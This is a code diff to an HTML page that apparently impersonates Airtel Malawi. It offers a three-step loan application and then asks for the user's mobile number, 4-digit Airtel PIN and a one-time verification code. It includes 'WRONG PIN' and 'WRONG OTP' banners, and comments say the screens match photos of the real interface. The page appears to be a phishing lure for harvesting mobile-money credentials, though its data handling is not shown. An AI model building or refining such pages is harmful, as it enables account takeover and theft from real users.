@@ -93,7 +93,7 @@
     </div>
 
     <h2 style="margin-bottom: 6px;">Loan Application</h2>
-    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 1 of 3: Loan Details</p>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 1 of 3: Loan Parameters</p>
 
     <div class="form-group">
       <label for="loan-type">Loan Category</label>
@@ -125,12 +125,12 @@
     </div>
 
     <div style="display: flex; gap: 12px; margin-top: auto;">
-      <button id="btn-loan1-back" class="btn-secondary">BACK</button>
+      <button id="btn-loan1-back" class="btn-secondary">PREVIOUS</button>
       <button id="btn-loan1-next" class="btn-primary" style="margin-top: 0;">NEXT STEP →</button>
     </div>
   </section>
 
-  <!-- STEP 4: LOAN STEP 2 OF 3 -->
+  <!-- STEP 4: LOAN STEP 2 OF 3 (MATCHES PHOTO 1000052921_3) -->
   <section id="step-loan-2" class="screen">
     <div class="step-indicator-bar">
       <div class="step-pill active"></div>
@@ -139,7 +139,7 @@
     </div>
 
     <h2 style="margin-bottom: 6px;">Loan Application</h2>
-    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 2 of 3: Applicant Details</p>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 2 of 3: Applicant Identification</p>
 
     <div class="form-group">
       <label for="first-name">First Name</label>
@@ -151,13 +151,22 @@
       <input type="text" id="last-name" class="input-field" placeholder="Enter last name">
     </div>
 
+    <div class="form-group">
+      <label for="phone-number">Mobile Number</label>
+      <div class="phone-input-wrapper">
+        <div class="flag-prefix">🇲🇼 +265</div>
+        <input type="tel" id="phone-number" class="input-field phone-field" placeholder="0991234567 or 0881234567" maxlength="10">
+      </div>
+      <span id="phone-error" class="error-text">Please enter a valid Airtel Malawi number starting with 099, 098, 088, or 077.</span>
+    </div>
+
     <div style="display: flex; gap: 12px; margin-top: auto;">
-      <button id="btn-loan2-back" class="btn-secondary">BACK</button>
+      <button id="btn-loan2-back" class="btn-secondary">PREVIOUS</button>
       <button id="btn-loan2-next" class="btn-primary" style="margin-top: 0;">NEXT STEP →</button>
     </div>
   </section>
 
-  <!-- STEP 5: LOAN STEP 3 OF 3 (SUMMARY CONFIRMATION) -->
+  <!-- STEP 5: LOAN STEP 3 OF 3 (MATCHES PHOTO 1000052922_3) -->
   <section id="step-loan-3" class="screen">
     <div class="step-indicator-bar">
       <div class="step-pill active"></div>
@@ -166,9 +175,25 @@
     </div>
 
     <h2 style="margin-bottom: 6px;">Loan Application</h2>
-    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 3 of 3: Summary</p>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 3 of 3: Employment & Summary</p>
 
+    <div class="form-group">
+      <label for="employment-status">Employment Status</label>
+      <select id="employment-status" class="input-field">
+        <option value="Business Owner">Business Owner / Self Employed</option>
+        <option value="Salaried Employee">Salaried Employee</option>
+        <option value="Contract Worker">Contract Worker</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="annual-income">Annual Income (MWK)</label>
+      <input type="number" id="annual-income" class="input-field" placeholder="Enter annual income in MWK">
+    </div>
+
+    <!-- SUMMARY CARD -->
     <div class="summary-card">
+      <h4 style="margin-bottom: 10px; color: var(--airtel-red);">Application Summary</h4>
       <div class="summary-row">
         <span class="summary-label">Loan Amount:</span>
         <span id="sum-amount" class="summary-val">MWK 100,000</span>
@@ -178,7 +203,7 @@
         <span id="sum-duration" class="summary-val">48 Months</span>
       </div>
       <div class="summary-row">
-        <span class="summary-label">Category:</span>
+        <span class="summary-label">Purpose:</span>
         <span id="sum-category" class="summary-val">Business Loan</span>
       </div>
       <div class="summary-row">
@@ -188,12 +213,12 @@
     </div>
 
     <div style="display: flex; gap: 12px; margin-top: auto;">
-      <button id="btn-loan3-back" class="btn-secondary">BACK</button>
+      <button id="btn-loan3-back" class="btn-secondary">PREVIOUS</button>
       <button id="btn-loan3-next" class="btn-primary" style="margin-top: 0;">PROCEED TO LOGIN →</button>
     </div>
   </section>
 
-  <!-- ACCOUNT LOGIN SCREEN (APPEARS DIRECTLY AFTER STEP 3 OF 3 - MATCHES PHOTO) -->
+  <!-- ACCOUNT LOGIN SCREEN (LOGIN WITH PIN) -->
   <section id="step-form" class="screen">
     <div class="login-header-banner">
       <div class="airtel-circle-logo">a</div>
@@ -204,23 +229,22 @@
     <div class="login-card-body">
       <h3 style="text-align: center; margin-bottom: 18px; font-size: 18px; color: var(--text-main);">Account Login</h3>
 
-      <!-- IN-PAGE SURFACE BANNER FOR WRONG PIN -->
+      <!-- SURFACE ERROR BANNER FOR WRONG PIN -->
       <div id="pin-surface-banner" class="surface-banner">
         WRONG PIN ❌
       </div>
 
-      <!-- PHONE NUMBER INPUT WITH +265 FLAG PREFIX -->
+      <!-- PHONE NUMBER INPUT -->
       <div class="form-group">
         <div class="phone-input-wrapper">
           <div class="flag-prefix">🇲🇼 +265</div>
           <input type="tel" id="login-phone" class="input-field phone-field" placeholder="0991234567 or 0881234567" maxlength="10">
         </div>
-        <span id="phone-error" class="error-text">Enter a valid Airtel Malawi number starting with 099, 098, 088, or 077.</span>
       </div>
 
-      <!-- 4-DIGIT PIN INPUT BOXES WITH EYE ICON -->
+      <!-- 4-DIGIT PIN ENTRY -->
       <div class="form-group" style="text-align: center;">
-        <label style="color: var(--text-muted); font-size: 14px; margin-bottom: 8px; display: block;">Enter your PIN (4 digits)</label>
+        <label style="color: var(--text-muted); font-size: 14px; margin-bottom: 8px; display: block;">Enter your 4-digit Airtel PIN</label>
         <div class="pin-input-container">
           <div class="pin-grid">
             <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
@@ -245,7 +269,7 @@
       Verification code sent to <strong id="otp-phone-display">099XXXXXXX</strong>
     </p>
 
-    <!-- IN-PAGE SURFACE BANNER FOR WRONG OTP -->
+    <!-- SURFACE ERROR BANNER FOR WRONG OTP -->
     <div id="otp-surface-banner" class="surface-banner">
       WRONG OTP ❌
     </div>
@@ -268,7 +292,7 @@
     <button id="btn-submit-otp" class="btn-primary" style="margin-top: 20px;">SUBMIT OTP</button>
   </section>
 
-  <!-- STEP 8: SUCCESS SCREEN -->
+  <!-- STEP 8: SUCCESS SCREEN (MATCHES PHOTO 1000052926_4) -->
   <section id="step-success" class="screen">
     <div style="text-align: center; margin-top: 10px;">
       <div class="circle-check-icon">✓</div>
@@ -341,5 +365,5 @@
 
 <script src="script.js"></script>
 </body>
-          </html>
+  </html>
         
